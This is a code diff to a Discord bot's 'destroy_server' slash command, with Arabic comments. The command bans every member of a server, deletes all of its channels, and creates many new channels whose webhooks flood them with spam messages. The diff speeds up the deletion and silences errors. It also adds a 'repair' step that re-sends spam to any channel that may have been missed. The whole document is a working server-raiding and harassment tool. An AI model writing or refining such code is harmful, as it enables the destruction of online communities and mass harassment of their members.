@@ -38,7 +38,7 @@ async def send_webhook_spams(
 
 @bot.tree.command(
     name="destroy_server",
-    description="أمر تدمير السيرفر السريع والمتزامن بالكامل",
+    description="أمر التدمير السريع مع الفحص والتعويض التلقائي لضمان عدم التفويت",
 )
 @app_commands.describe(
     room_name="اسم الرومات الجديدة (بدون أرقام)",
@@ -62,7 +62,7 @@ async def destroy_server(
         return
 
     await interaction.response.send_message(
-        "جاري التنفيذ السريع...", ephemeral=True
+        "جاري التنفيذ السريع مع نظام التأمين الشامل...", ephemeral=True
     )
     guild = interaction.guild
 
@@ -72,31 +72,21 @@ async def destroy_server(
             return
         try:
             await guild.ban(member, reason="تدمير السيرفر")
-        except Exception as e:
-            print(f"فشل حظر {member.name}: {e}")
+        except:
+            pass
 
     ban_tasks = [ban_member(m) for m in guild.members]
 
-    # 2. حذف الرومات بدفعات متوازية سريعة تمنع التوقف
+    # 2. حذف الرومات بدفعات متوازية سريعة
     channels_to_delete = [
         c for c in guild.channels if c.id != interaction.channel.id
     ]
 
     async def delete_batch(channels):
-        tasks = []
-        for channel in channels:
-
-            async def delete_single(ch):
-                try:
-                    await ch.delete()
-                except Exception as e:
-                    print(f"فشل حذف الروم {ch.name}: {e}")
-
-            tasks.append(delete_single(channel))
+        tasks = [ch.delete() for ch in channels]
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
 
-    # تقسيم الرومات إلى دفعات سريعة جداً
     batch_size = 5
     channel_batches = [
         channels_to_delete[i : i + batch_size]
@@ -106,14 +96,14 @@ async def destroy_server(
     async def delete_all_in_batches():
         for batch in channel_batches:
             await delete_batch(batch)
-            await asyncio.sleep(0.02)
+            await asyncio.sleep(0.01)
 
-    # 3. إنشاء الرومات والويب هوكات والسبام دفعة واحدة
+    # 3. إنشاء الرومات والويب هوكات والسبام مع تتبع الرومات الناجحة
     category = interaction.channel.category
+    created_channels = []
 
     async def create_and_spam(i):
         try:
-            name = room_name
             overwrites = {
                 guild.default_role: discord.PermissionOverwrite(
                     send_messages=True, view_channel=True
@@ -121,25 +111,46 @@ async def destroy_server(
             }
             if category:
                 channel = await guild.create_text_channel(
-                    name, category=category, overwrites=overwrites
+                    room_name, category=category, overwrites=overwrites
                 )
             else:
-                channel = await guild.create_text_channel(name, overwrites=overwrites)
+                channel = await guild.create_text_channel(
+                    room_name, overwrites=overwrites
+                )
 
+            created_channels.append(channel)
             webhook = await channel.create_webhook(name=webhook_name)
             await send_webhook_spams(webhook, message_content, messages_count)
-        except Exception as e:
-            print(f"خطأ في إنشاء الروم: {e}")
+        except:
+            pass
 
     create_tasks = [create_and_spam(i) for i in range(1, rooms_count + 1)]
 
-    # إطلاق العمليات كلها مع بعض
+    # إطلاق العمليات الأساسية معاً
     await asyncio.gather(
         asyncio.gather(*ban_tasks, return_exceptions=True),
         delete_all_in_batches(),
         asyncio.gather(*create_tasks, return_exceptions=True),
         return_exceptions=True,
     )
+
+    # **4. خطوة التأمين والتعويض الذكي (الفحص الأخير)**
+    # البوت يشيك على الرومات اللي أُنشئت ويتأكد هل فيها ويب هوك أرسل ولا لا، وإذا لقى روم ما وصله شي يعوضه فوراً
+    async def repair_and_spam(channel):
+        try:
+            webhooks = await channel.webhooks()
+            if not webhooks:
+                webhook = await channel.create_webhook(name=webhook_name)
+                await send_webhook_spams(webhook, message_content, messages_count)
+            else:
+                # لو الويب هوك موجود بس ما أرسل (أو كإجراء إضافي للتأكد)
+                await send_webhook_spams(webhooks[0], message_content, messages_count)
+        except:
+            pass
+
+    repair_tasks = [repair_and_spam(ch) for ch in created_channels if ch in guild.channels]
+    if repair_tasks:
+        await asyncio.gather(*repair_tasks, return_exceptions=True)
 
     # حذف الروم الحالي بالآخر
     try:
